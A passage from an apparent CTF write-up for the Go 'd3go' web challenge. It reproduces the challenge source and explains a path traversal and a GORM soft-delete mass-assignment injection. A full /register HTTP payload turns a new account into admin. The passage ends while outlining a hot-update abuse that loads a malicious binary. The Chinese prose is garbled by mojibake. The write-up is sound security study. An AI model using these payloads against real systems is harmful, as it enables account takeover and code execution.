Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  ErrFormatError,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	err = auth.Register(&amp;u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  ErrInternalServer,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">		StatusCode: <span class="number">0</span>,</span><br><span class="line">		StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	uu := uuid.New()</span><br><span class="line"></span><br><span class="line">	zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">		StatusCode: <span class="number">0</span>,</span><br><span class="line">		StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">		Data:       tree.Children,</span><br><span class="line">	&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>db.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;d3go/config&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line">	err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalln(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// create admin</span></span><br><span class="line">	rand.Seed(time.Now().UnixMicro())</span><br><span class="line">	<span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">	rand.Read(rad[:])</span><br><span class="line">	<span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">		db.Save(&amp;model.User&#123;</span><br><span class="line">			Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">			Password: hex.EncodeToString(rad[:]),</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line">	<span class="keyword">var</span> database *gorm.DB</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">		database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		&#125;</span><br><span class="line">		db = database</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> admin model.User</span><br><span class="line">	<span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Error(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line">		<span class="keyword">return</span> ErrDatabase</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckAuth</span><span class="params">(u *model.User)</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.Where(<span class="string">&quot;username = ? AND password = ?&quot;</span>, u.Username, u.Password).First(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsFirstRegistered</span><span class="params">()</span></span> (<span class="type">bool</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.First(&amp;model.User&#123;&#125;).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> errors.Is(err, gorm.ErrRecordNotFound) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>, <span class="literal">nil</span></span><br><span class="line">		&#125;</span><br><span class="line">		log.WithField(<span class="string">&quot;user&quot;</span>, model.User&#123;&#125;).Error(err)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>, ErrDatabase</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>auth.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> auth</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;d3go/config&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/db&quot;</span></span><br><span class="line">	<span class="string">&quot;d3go/model&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	UnAuthed <span class="type">int</span> = <span class="literal">iota</span> - <span class="number">1</span></span><br><span class="line">	User</span><br><span class="line">	Admin</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(u *model.User)</span></span> (<span class="type">int</span>, <span class="type">error</span>) &#123;</span><br><span class="line">	ok, err := db.CheckAuth(u)</span><br><span class="line">	<span class="keyword">if</span> !ok || err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> UnAuthed, err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> config.Conf.NoAdminLogin &amp;&amp; u.ID == <span class="number">1</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> UnAuthed, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> db.IsAdmin(u) &#123;</span><br><span class="line">		<span class="keyword">return</span> Admin, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> User, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> db.AddUser(u)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>user.go</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model</span><br><span class="line">	Username <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span></span><br><span class="line">	Password <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åœ¨<code>main.go</code>ä¸­æ²¡æœ‰å¯¹<code>../</code>å¤„ç†,å¯¼è‡´äº†ç›®å½•ç©¿è¶Š</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123; <span class="comment">//c è¯·æ±‚ä¿¡æ¯.URL,å‚æ•°,å¤´éƒ¨</span></span><br><span class="line">	<span class="comment">// unzipped file server</span></span><br><span class="line">	p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123; <span class="comment">//å¦‚æœä»¥/unzippedå¼€å¤´,</span></span><br><span class="line">			p = <span class="string">&quot;/&quot;</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			p = p[<span class="number">9</span>:]</span><br><span class="line">		&#125;</span><br><span class="line">		c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>)) <span class="comment">//å¼€å¯/unzippedç›®å½•æ¥å£è¯»å–å…¶ä¸­çš„pæ–‡ä»¶</span></span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// embed static file server</span></span><br><span class="line">	p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>) <span class="comment">//å¦‚æœæ²¡æœ‰ä»¥/unzippedå¼€å¤´,å½“ä½œé™æ€æ–‡ä»¶è¯»å–</span></span><br><span class="line">	c.FileFromFS(p, http.FS(Static))</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>controller.go</code>ä¸­æåˆ°äº†<code>model.User&#123;&#125;</code>ç»“æ„ä½“</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">	u := &amp;model.User&#123;&#125;</span><br><span class="line">	err := c.ShouldBindJSON(u)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">			StatusCode: <span class="number">-1</span>,</span><br><span class="line">			StatusMsg:  ErrFormatError,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>user.go</code>ä¸­å£°æ˜ä¸€ä¸ª<code>struct</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> model</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model        <span class="comment">//å®ç°é€šç”¨å­—æ®µæ¨¡å‹</span></span><br><span class="line">	Username   <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(20);not null;unique&quot; json:&quot;username&quot;`</span> <span class="comment">//è®¾ç½®æ ‡ç­¾:varcharç±»å‹é•¿åº¦20,éç©º,å”¯ä¸€</span></span><br><span class="line">	Password   <span class="type">string</span> <span class="string">`gorm:&quot;type:varchar(100);not null&quot; json:&quot;password&quot;`</span></span><br><span class="line">&#125; <span class="comment">//ä¾¿äºä½œä¸ºå‚æ•°ä¼ é€’ç»™GORMç›¸å…³æ–¹æ³•è¿›è¡Œæ“ä½œ</span></span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°<code>gorm.Model</code>ä¸­å­˜åœ¨<code>DeleteAt</code>å­—æ®µ,ä¹Ÿå°±æ˜¯è¯´åœ¨æˆ‘ä»¬åˆ é™¤æŸä¸€æ•°æ®æ—¶ä¼šè‡ªåŠ¨æŠŠ<code>DeleteAt</code>å­—æ®µçš„å€¼è®¾ç½®ä¸ºå½“å‰æ—¶é—´æˆ³è€Œéç›´æ¥åˆ é™¤å­—æ®µ,å¯ä»¥è¿›è¡Œè½¯åˆ é™¤æ³¨å…¥</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230509150950537.png" alt="image-20230509150950537"></p>
<p>ç”±äºåªæœ‰<code>admin</code>æ‰å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ,å‘ç°åœ¨<code>db.go</code>ä¸­é…ç½®ä»¥ç¬¬ä¸€ä¸ªç”¨æˆ·è®°å½•ä½œä¸º<code>admin</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> admin model.User</span><br><span class="line">	<span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123; <span class="comment">//æŸ¥è¯¢ç¬¬ä¸€ä¸ªç”¨æˆ·è®°å½•å¹¶å°†å…¶æ”¾å…¥adminå†…å­˜åœ°å€</span></span><br><span class="line">		log.Error(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> u.Username == admin.Username</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äº<code>register</code>æ²¡æœ‰å¯¹ä¼ å…¥çš„æ•°æ®è¿›è¡Œå¤„ç†,ç›´æ¥é€šè¿‡<code>err := c.ShouldBindJSON(&amp;u)</code>æŠŠè¯·æ±‚æ•°æ®è§£æç»™äº†ç»“æ„ä½“<code>u</code>,db.goä¸­çš„<code>AddUser</code>å‡½æ•°ç›´æ¥è¿›è¡Œå†™å…¥æ“ä½œ<code>db.Save(u)</code>å¯¼è‡´è½¯åˆ é™¤æ³¨å…¥</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">AddUser</span><span class="params">(u *model.User)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	<span class="keyword">if</span> err := db.Save(u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.WithField(<span class="string">&quot;user&quot;</span>, u).Error(err)</span><br><span class="line">		<span class="keyword">return</span> ErrDatabase</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸¤ä¸ªdatå­—æ®µéƒ½è¦è®¾ç½®</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;deletedat&quot;</span><span class="punctuation">:</span><span class="string">&quot;2011-01-01T11:11:11Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;createdat&quot;</span><span class="punctuation">:</span><span class="string">&quot;2011-01-01T11:11:11Z&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/register</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:8080</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost:8080</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost:8080/</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">,</span><span class="attr">&quot;deletedat&quot;</span><span class="punctuation">:</span><span class="string">&quot;2011-01-01T11:11:11Z&quot;</span><span class="punctuation">,</span><span class="attr">&quot;createdat&quot;</span><span class="punctuation">:</span><span class="string">&quot;2011-01-01T11:11:11Z&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ­£å¸¸æ³¨å†Œä¸€ä¸ªtestç”¨æˆ·ç™»å½•å³ä¸ºadminæƒé™</p>
<p>å®¡è®¡<code>config.go</code>å’Œ<code>main.go</code>å¯ä»¥å¾—çŸ¥å®ç°äº†çƒ­æ›´æ–°,å¯ä»¥å®ç°è¦†ç›–<code>config.yaml</code>å®ç°è‡ªæ›´æ–°</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	config.Init()</span><br><span class="line">	db.Init()</span><br><span class="line">	<span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">		log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">		err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">			Program: prog,</span><br><span class="line">			Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">			Fetcher: &amp;config.Fetch,</span><br><span class="line">		&#125;)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatalln(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		r := gin.Default()</span><br><span class="line">		InitRouter(r)</span><br><span class="line">		<span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Fatal(err)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>éœ€è¦è®©urlæŒ‡å‘ä¸€ä¸ªç¼–è¯‘è¿‡åçš„goäºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œç›‘æµ‹å®ç°çƒ­æ›´æ–°</p>
<p>å‘ç°æœ‰ä¸€ä¸ªd3goçš„äºŒè¿›åˆ¶æ–‡ä»¶,å¯ä»¥åˆ©ç”¨è¿™ä¸ªè¿›è¡Œçƒ­æ›´æ–°<img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230507221444259.png" alt="image-20230507221444259"></p>
<p>d3goæ¶æ„æ–‡ä»¶,ç¼–è¯‘ä¸ºäºŒè¿›åˆ¶</p>
